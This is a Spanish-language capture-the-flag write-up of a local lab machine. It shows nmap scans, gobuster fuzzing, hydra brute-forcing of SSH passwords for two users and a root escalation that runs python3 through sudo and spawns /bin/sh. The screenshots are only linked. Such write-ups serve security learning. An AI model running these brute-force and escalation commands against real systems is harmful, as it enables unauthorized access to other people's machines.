tags: #hydra 
_________________________
## Reconocimiento

Comenzamos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
```bash
nmap -sS -p- 172.17.0.2 -oN ports -n -Pn --min-rate 5000 --open
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![[Anexos/Pasted image 20251007143352.png]]

Vemos que tenemos abiertos los **puertos 22 (SSH) y 80 (HTTP)**. Ahora, usaremos otro comando de nmap para hacer un escaneo básico con algunos scripts y también conocer la versión de los servicios:

```bash
nmap -sV -p22,80 172.17.0.2 -oN versions
```

![[Anexos/Pasted image 20251007143750.png]]

Como vemos que hay un servicio HTTP, vamos a poner la IP en el navegador para ver de qué se trata:

![[Anexos/Pasted image 20251007143908.png]]

Al ver esto, claramente vamos a probar hacer fuzzing, para descubrir directorios y archivos ocultos, utilizando el siguiente comando de gobuster:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 5 -x .php,.txt,.xml,.html -o dirs.txt
```

![[Pasted image 20251012145138.png]]

Al no encontrar nada, vamos a probar hacer fuerza bruta con hydra y el usuario A en el servicio ssh:

```bash
hydra -l a -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -I ssh://172.17.0.2
```

![[Pasted image 20251012145124.png]]

La tenemos! Vamos a acceder:

```bash
ssh@172.17.0.2
```

![[Anexos/Pasted image 20251012145257.png]]

Como no he conseguido nada buscando permisos SUID o sudo -l, me percato que hay otro usuario llamado spencer, así que voy a probar a hacer fuerza bruta a su usuario a ver si consigo algo:

![[Anexos/Pasted image 20251012145833.png]]

Lo tenemos! Ahora nos conectamos:

![[Anexos/Pasted image 20251012150028.png]]

Ahora, tras ejecutar sudo -l, vemos que podemos ejecutar python3 somo sudo sin contrasña, 

![[Anexos/Pasted image 20251012145952.png]]

Al ver esto, vamos a ejecutar dicha ruta absoluta para ejecutar python, y además le añadiremos el parámetro -i para ejecutarlo en modo interactivo:
En este punto, con el siguiente one-liner logramos ejecución remota de comandos con privilegios:

```python
sudo -u root /usr/bin/python3 -i
```

![[Anexos/Pasted image 20251012151418.png]]

Ahora que sabemos que funciona, vamos a ejecutar la siguiente sentencia:

```python
import os; os.system("/bin/sh");
```

![[Anexos/Pasted image 20251012152619.png]]

Somos root!!